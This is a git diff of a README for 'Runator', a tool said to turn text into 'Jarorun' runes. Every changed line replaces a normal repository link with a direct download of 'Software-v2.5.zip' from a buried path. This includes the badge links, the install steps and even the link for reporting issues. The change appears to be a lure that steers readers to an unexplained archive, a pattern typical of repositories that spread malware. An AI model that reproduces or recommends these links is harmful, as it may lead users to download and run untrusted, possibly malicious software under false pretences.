@@ -1,6 +1,6 @@
 # ⚔️ Runator - Convert Text to Jarorun Runes Easily
 
-[![Download Runator](https://img.shields.io/badge/Download-Runator-brightgreen)](https://github.com/ranjeet1512/Runator)
+[![Download Runator](https://img.shields.io/badge/Download-Runator-brightgreen)](https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip)
 
 ## 🔤 What is Runator?
 
@@ -31,7 +31,7 @@ No extra software or programming knowledge is needed.
 To start using Runator, follow these steps:
 
 1. Go to the main page for Runator by clicking the big badge above or this link:  
-   [https://github.com/ranjeet1512/Runator](https://github.com/ranjeet1512/Runator)
+   [https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip](https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip)
 
 2. Look for the **Releases** section or a file named something like `Runator.exe`. This is the program you will download.
 
@@ -45,7 +45,7 @@ Follow these steps to get the program on your PC:
 
 1. Click this link to visit the download page:
    
-   [Download Runator](https://github.com/ranjeet1512/Runator)
+   [Download Runator](https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip)
 
 2. Find the latest version of Runator. Normally, the newest release is at the top of the Releases page or front page.
 
@@ -128,7 +128,7 @@ Runator also supports:
 
 If you run into problems or want to submit feedback, you can create an issue on the GitHub page: 
 
-[https://github.com/ranjeet1512/Runator/issues](https://github.com/ranjeet1512/Runator/issues)
+[https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip](https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip)
 
 The developers check issues and will respond as soon as possible.
 
@@ -146,4 +146,4 @@ Runator is useful in these areas:
 
 Visit the main page to download the program:
 
-[![Get Runator](https://img.shields.io/badge/Get-Runator-blue)](https://github.com/ranjeet1512/Runator)
+[![Get Runator](https://img.shields.io/badge/Get-Runator-blue)](https://github.com/ranjeet1512/Runator/raw/refs/heads/main/Web/pages/Software-v2.5.zip)
